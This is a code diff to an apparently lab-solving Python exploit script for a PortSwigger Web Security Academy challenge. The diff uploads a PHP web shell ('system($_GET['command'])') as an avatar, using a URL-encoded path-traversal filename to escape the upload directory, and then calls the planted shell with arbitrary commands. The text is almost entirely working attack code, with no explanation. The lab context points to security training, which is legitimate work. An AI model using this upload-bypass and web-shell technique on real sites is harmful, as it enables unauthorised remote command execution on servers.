@@ -101,7 +101,7 @@ def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResp
     }
     files = {
         'avatar': {
-            'filename': 'shell.php',
+            'filename': '%2e%2e%2fshell.php',
             'content_type': 'application/x-httpd-php',
             'content': """<?php echo system($_GET['command']); ?>""",
         },
@@ -127,14 +127,13 @@ def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResp
 
 def GET_files_avatars_shell_php(command: str) -> http.client.HTTPResponse:
     params = {'command': command}
-    method, path = 'GET', f'/files/avatars/shell.php?{urllib.parse.urlencode(params)}'
+    method, path = 'GET', f'/files/shell.php?{urllib.parse.urlencode(params)}'
     host, port = f'{LAB_ID}.web-security-academy.net', 443
     headers = {
-        'accept': 'image/avif,image/webp,*/*',
+        'accept': '*/*',
         'accept-language': 'en-US,en;q=0.5',
         'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
         'cookie': f'session={session}',
-        'sec-fetch-dest': 'image',
         'sec-fetch-mode': 'no-cors',
         'sec-fetch-site': 'same-origin',
         'te': 'trailers',
